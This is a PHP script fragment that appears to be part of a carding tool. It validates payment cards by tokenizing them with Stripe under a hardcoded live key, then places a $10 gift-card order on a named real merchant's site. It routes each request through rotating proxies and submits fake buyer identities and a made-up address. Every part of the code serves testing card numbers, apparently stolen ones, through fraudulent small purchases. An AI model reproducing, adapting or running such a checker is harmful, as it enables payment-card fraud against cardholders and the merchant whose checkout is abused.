<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$data = 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78ef418&time_on_page='.rand(50000, 100000).'&key=pk_live_Jq3CZd5Evy7qrda3zDfZ9A5D';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;

$r2 = $this->curlx->Get('https://frynpan.net/gift-cards/', null, null, $server['proxy']);

if (!$r2->success) goto start;

$bID = trim(strip_tags($this->getstr($r2->body, "'bID':", "'")));

$cID = trim(strip_tags($this->getstr($r2->body, "'cID':", "'")));

$ccm_token = trim(strip_tags($this->getstr($r2->body, "'ccm_token': '", "'")));

if (empty($bID) || empty($cID) || empty($ccm_token)) {
	$empty = 'Second Request Tokens are Empty';

	goto start;
}

$data = 'card1Amount=10&card1Quantity=1&card1To=&card1From=&card1Message=&card2Amount=0&card2Quantity=0&card2To=&card2From=&card2Message=&card3Amount=0&card3Quantity=0&card3To=&card3From=&card3Message=&card4Amount=0&card4Quantity=0&card4To=&card4From=&card4Message=&card5Amount=0&card5Quantity=0&card5To=&card5From=&card5Message=&firstName='.$fake->first.'&lastName='.$fake->last.'&email='.urlencode($fake->email).'&phone=&shippingAddress=12+main+street&shippingAddressCity=Brewster&shippingAddressState=New+York&shippingAddressZip=10509&honeypot1=&honeypot2=7&amountOwed=10&stripeToken='.$tok.'&bID='.$bID.'&cID='.$cID.'&ccm_token='.urlencode($ccm_token).'';

$r3 = $this->curlx->Post('https://frynpan.net/tools/packages/custom_contact_form/ajax_submit', $data, null, null, $server['proxy']);

if (!$r3->success) goto start;

$json_r3 = json_decode($r3->body);

$err = implode($json_r3->errors ?? []);

$err = trim(str_replace('Please verify you entered it correctly and try again. If you continue having trouble, please contact us.', '', $err));

$status = $this->response->Stripe($r3->body, $err);

end: